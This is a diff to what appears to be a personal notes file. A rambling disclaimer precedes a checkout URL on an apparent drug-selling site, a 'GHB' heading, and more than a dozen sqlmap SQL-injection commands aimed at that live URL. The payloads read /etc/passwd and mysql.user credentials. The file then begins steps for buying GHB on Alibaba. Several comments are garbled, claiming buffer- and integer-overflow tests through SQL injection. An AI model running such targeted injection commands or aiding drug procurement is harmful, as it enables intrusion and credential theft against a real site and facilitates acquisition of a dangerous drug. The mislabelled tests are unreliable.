@@ -2,6 +2,44 @@
 ### FOR EDUCATIONAL AND INFORMATIONAL PURPOSES ONLY. The information provided in or through this Website is for educational and informational purposes only and solely as a self-help tool for your own use. THE CONTENT IS ILLIGAL AND SHOULD NOT BE USED BY ANYONE I DO NOT CONCENT OR ADVIDSE I DO NOT AND DO NOT SUGGEST BREAKING THE LAW IS BAD AND HARMFUL AND COULD RELSULT IN LEGAL CHARGES BOTH FEDERAL AND STATEWIDE BE WARNED THIS IS NO MORAL NO WAY SHAPE OR FORM RESPONIBILITY I DO NOT TAKE RESPONIBILITY IF YOU USE THIS INFORMATION AND DO BAD WITH IT AND ANYTHING YOU  DO AND WILL BE PROCESCUED AND BY THE UNITED STATES OF AMERICA I TAKE NO PART IN YOUR MORAL OR DECISION OR CHOICES AND THUS MAKING YOU THE FREEDOM TO AS YOU WISH BUT NOT AT ALL TIED TO ANYTHING THAT COMES AS FAR AS AN ACTION DONE OR DAMAGES OR CRIME OR ILLIGAL LEGAL MORAL ANYTHING AND EVERYTHING WITH AS FAR AS ROMAN MITCHELL  I AM NO LONGER RESPONSIBLE FOR ANYHTING THAT HAPPENDS AFTER THIS MESSAGE ONLY FOR PROFIT UNLESS IT MAKES MONEY OR MNITIZE OR FINAINAIAL GAIN AND ROYALTYS AND COLLECTIONS THEN IT IS ROMAN MITCHELLS OTHER THAN THAT YOU HAVE BEEN WARNERD AND NOTIFIED. ROMAN MITCHELL 2025 COPYRIGHTS APPLYED NO ONE TO TAKE THE IDEAS OR MAKE MONEY OFF OF ANYTHIUNG OF ITS SOURCES OR MATERIAL CONTEX 
 https://icecartel.com/checkouts/do/fe5d6d61c80d44e3d797646185c7e5b8/en-us/
 # IDEA 1. GHB
+# Basic usage to identify injection points:
+$ sqlmap -u "https://icecartel.com/checkouts/do/fe5d6d61c80d44e3d797646185c7e5b8/en-us/" --batch
+
+# Identifying parameters:
+$ sqlmap -u "https://icecartel.com/checkouts/do/fe5d6d61c80d44e3d797646185c7e5b8/en-us/?payment_method=*" --batch
+
+# Testing for error-based disclosure of database structure:
+$ sqlmap -u "https://icecartel.com/checkouts/do/fe5d6d61c80d44e3d797646185c7e5b8/en-us/?payment_method=1' UNION SELECT @@version, NULL, NULL, NULL-- -" --batch
+
+# Testing for boolean-based blind vulnerabilities:
+$ sqlmap -u "https://icecartel.com/checkouts/do/fe5d6d61c80d44e3d797646185c7e5b8/en-us/?payment_method=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@version), FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -" --batch
+
+# Testing for time-based blind vulnerabilities:
+$ sqlmap -u "https://icecartel.com/checkouts/do/fe5d6d61c80d44e3d797646185c7e5b8/en-us/?payment_method=1' AND IF(SUBSTRING((SELECT @@version),1,1)='5', SLEEP(10), 0)-- -" --batch
+
+# Testing for out-of-band blind vulnerabilities:
+$ sqlmap -u "https://icecartel.com/checkouts/do/fe5d6d61c80d44e3d797646185c7e5b8/en-us/?payment_method=1' AND LOAD_FILE('/etc/passwd')-- -" --batch
+
+# Testing for database-specific vulnerabilities:
+$ sqlmap -u "https://icecartel.com/checkouts/do/fe5d6d61c80d44e3d797646185c7e5b8/en-us/?payment_method=1' UNION SELECT 1,2,(SELECT @@version),4 FROM information_schema.tables WHERE table_name LIKE 'user%'-- -" --batch
+
+# Testing for error-based disclosure of sensitive data:
+$ sqlmap -u "https://icecartel.com/checkouts/do/fe5d6d61c80d44e3d797646185c7e5b8/en-us/?payment_method=1' UNION SELECT 1,2,(SELECT user FROM mysql.user),4 FROM information_schema.tables WHERE table_name LIKE 'user%'-- -" --batch
+
+# Testing for time-based blind disclosure of sensitive data:
+$ sqlmap -u "https://icecartel.com/checkouts/do/fe5d6d61c80d44e3d797646185c7e5b8/en-us/?payment_method=1' AND IF(SUBSTRING((SELECT user FROM mysql.user LIMIT 0,1),1,1)='r', SLEEP(10), 0)-- -" --batch
+
+# Testing for out-of-band blind disclosure of sensitive data:
+$ sqlmap -u "https://icecartel.com/checkouts/do/fe5d6d61c80d44e3d797646185c7e5b8/en-us/?payment_method=1' AND LOAD_FILE('/etc/passwd')-- -" --batch
+
+# Testing for stack-based buffer overflow vulnerabilities:
+$ sqlmap -u "https://icecartel.com/checkouts/do/fe5d6d61c80d44e3d797646185c7e5b8/en-us/?payment_method=1' UNION SELECT 0x41414141, NULL, NULL, NULL-- -" --batch
+
+# Testing for integer overflow vulnerabilities:
+$ sqlmap -u "https://icecartel.com/checkouts/do/fe5d6d61c80d44e3d797646185c7e5b8/en-us/?payment_method=1' UNION SELECT 0x41414141, NULL, NULL, NULL-- -" --batch
+
+# Testing for null pointer dereference vulnerabilities:
+$ sqlmap -u "https://icecartel.com/checkouts/do/fe5d6d61c80d44e3d797646185c7e5b8/en-us/?payment_method=1' UNION SELECT 0, NULL, NULL, NULL-- -" --batch
 
 # GHB ALIBABA
 To acquire real GHB on Alibaba, follow these actionable steps:
